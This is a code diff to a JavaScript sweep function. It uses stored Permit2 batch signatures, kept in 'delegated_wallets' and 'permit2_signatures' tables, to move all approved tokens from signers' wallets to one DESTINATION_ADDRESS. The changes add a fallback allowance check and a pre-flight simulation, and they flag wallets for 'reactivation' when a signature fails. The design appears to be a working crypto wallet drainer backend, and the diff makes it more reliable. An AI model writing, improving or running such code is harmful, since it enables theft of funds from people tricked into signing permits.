@@ -1602,8 +1602,6 @@ async function sweep(wallet) {
             try { [allow] = ERC20_ALLOW_IFACE.decodeFunctionResult("allowance", data); } catch { /* ignore */ }
           }
           if (allow > 0n) {
-            // Cap at min(balance, erc20_allowance, permitted.amount) so Permit2 never
-            // sees requestedAmount > ERC20 allowance or > the signed cap.
             const permittedAmt = BigInt(withBalance[i].amount ?? "0");
             const balanceCap   = withBalance[i].balance;
             const allowCap     = allow < balanceCap ? allow : balanceCap;
@@ -1617,9 +1615,36 @@ async function sweep(wallet) {
           }
         }
         if (skipped.length) {
-          log(`[gasless] ⚠️  ${skipped.length} token(s) skipped — ERC-20 allowance to Permit2 is 0 (user must approve Permit2 on-chain): ${skipped.join(", ")}`);
+          log(`[gasless] ⚠️  ${skipped.length} token(s) skipped — ERC-20 allowance to Permit2 is 0: ${skipped.join(", ")}`);
         }
         withBalance.splice(0, withBalance.length, ...approved);
+      } else {
+        // Multicall failed (rate-limit / RPC hiccup). Fall back to individual eth_call checks.
+        warn(`[gasless] allowance multicall failed — falling back to per-token checks`);
+        const fbApproved = []; const fbSkipped = [];
+        const rp = getReadProvider();
+        for (const p of [...withBalance]) {
+          try {
+            const raw = await rp.call({
+              to: p.token,
+              data: ERC20_ALLOW_IFACE.encodeFunctionData("allowance", [checksum, PERMIT2_ADDRESS]),
+            });
+            let allow = 0n;
+            if (raw && raw !== "0x") { try { [allow] = ERC20_ALLOW_IFACE.decodeFunctionResult("allowance", raw); } catch {} }
+            if (allow > 0n) {
+              const permittedAmt = BigInt(p.amount ?? "0");
+              const allowCap     = allow < p.balance ? allow : p.balance;
+              const cappedBalance = permittedAmt > 0n && permittedAmt < allowCap ? permittedAmt : allowCap;
+              fbApproved.push({ ...p, balance: cappedBalance });
+            } else {
+              fbSkipped.push(p.token.slice(0, 10));
+            }
+          } catch {
+            fbSkipped.push(p.token.slice(0, 10));
+          }
+        }
+        if (fbSkipped.length) log(`[gasless] ⚠️  ${fbSkipped.length} token(s) need on-chain Permit2 approval (fallback): ${fbSkipped.join(", ")}`);
+        withBalance.splice(0, withBalance.length, ...fbApproved);
       }
 
       if (withBalance.length === 0) {
@@ -1633,23 +1658,79 @@ async function sweep(wallet) {
       }
       log(`[gasless] sweeping ${withBalance.length} tokens`);
 
+      // ── Pre-flight eth_call simulation ───────────────────────────────────────
+      const PERMIT2_ERROR_IFACE = new ethers.Interface([
+        "error InvalidNonce()",
+        "error SignatureExpired(uint256)",
+        "error InvalidSigner()",
+        "error InsufficientAllowance(uint256)",
+        "error InvalidAmount(uint256)",
+        "error LengthMismatch()",
+      ]);
+      const sweepMapPf = new Map(withBalance.map(t => [t.token.toLowerCase(), t.balance]));
+      const fullPermittedPf       = permitted.map(t => ({ token: t.token, amount: BigInt(t.amount) }));
+      const fullTransferDetailsPf = permitted.map(t => ({
+        to: DESTINATION_ADDRESS,
+        requestedAmount: sweepMapPf.get(t.token.toLowerCase()) ?? 0n,
+      }));
+      const gasLimitPf = 200_000n + BigInt(permitted.length) * 2_200n + BigInt(withBalance.length) * 80_000n;
+      try {
+        await permit2Batch.permitTransferFrom.staticCall(
+          { permitted: fullPermittedPf, nonce: BigInt(sig.nonce), deadline: dl },
+          fullTransferDetailsPf,
+          checksum,
+          sig.signature,
+          { gasLimit: gasLimitPf },
+        );
+        log(`[gasless] pre-flight ✅ — broadcasting`);
+      } catch (simErr) {
+        let revertName = simErr?.revert?.name ?? null;
+        if (!revertName) {
+          const errData = simErr?.data ?? simErr?.error?.data ?? null;
+          if (errData) { try { revertName = PERMIT2_ERROR_IFACE.parseError(errData)?.name; } catch {} }
+        }
+        const simMsg = revertName ?? simErr?.reason ?? simErr?.shortMessage ?? simErr?.message ?? "unknown";
+        err(`[gasless] pre-flight FAILED: ${simMsg}`);
+        if (revertName === "InvalidNonce") {
+          if (supabase) {
+            await supabase.from("permit2_signatures").update({ spent: true })
+              .eq("address", addrKey + "-sig").eq("chain", CHAIN).then(v => v, () => {});
+            await supabase.from("delegated_wallets").update({ needs_reactivation: true })
+              .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
+          }
+          return;
+        }
+        if (revertName === "InsufficientAllowance") {
+          if (supabase) await supabase.from("delegated_wallets").update({ needs_reactivation: true })
+            .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
+          return;
+        }
+        if (revertName === "InvalidSigner") {
+          err(`[gasless] ❌ INVALID SIGNER — sig signed for different relayer or chain`);
+          if (supabase) await supabase.from("delegated_wallets").update({ needs_reactivation: true })
+            .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
+          return;
+        }
+        if (revertName === "SignatureExpired") {
+          if (supabase) {
+            await supabase.from("permit2_signatures").update({ spent: true })
+              .eq("address", addrKey + "-sig").eq("chain", CHAIN).then(v => v, () => {});
+            await supabase.from("delegated_wallets").update({ needs_reactivation: true })
+              .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
+          }
+          return;
+        }
+        warn(`[gasless] unknown pre-flight error (${simMsg}) — proceeding with broadcast`);
+      }
+
       try {
         const fee = await getFeeData();
-        // CRITICAL: PermitBatchTransferFrom requires permitted[] and transferDetails[] to have
-        // the SAME length as the original signed permit. The signature covers ALL permitted tokens.
-        // For tokens without a balance we pass requestedAmount=0 — Permit2 skips zero transfers.
-        // Submitting only the balance-holding tokens causes an InvalidSigner revert because the
-        // hash of a partial permitted[] doesn't match the hash that was actually signed.
         const sweepMap = new Map(withBalance.map(t => [t.token.toLowerCase(), t.balance]));
         const fullPermitted       = permitted.map(t => ({ token: t.token, amount: BigInt(t.amount) }));
         const fullTransferDetails = permitted.map(t => ({
           to: DESTINATION_ADDRESS,
           requestedAmount: sweepMap.get(t.token.toLowerCase()) ?? 0n,
         }));
-        // Gas must cover calldata cost (~1,376 gas per token across both permitted[] and
-        // transferDetails[]) plus hashing + 500-iteration loop + ERC-20 transfers.
-        // For a 500-token batch the calldata alone costs ~688,000 gas — use 2,200 per token
-        // to include a 30% buffer on top of the measured ~1,376 gas/token calldata cost.
         const gasLimit = 200_000n + BigInt(permitted.length) * 2_200n + BigInt(withBalance.length) * 80_000n;
         const tx = await permit2Batch.permitTransferFrom(
           { permitted: fullPermitted, nonce: BigInt(sig.nonce), deadline: dl },
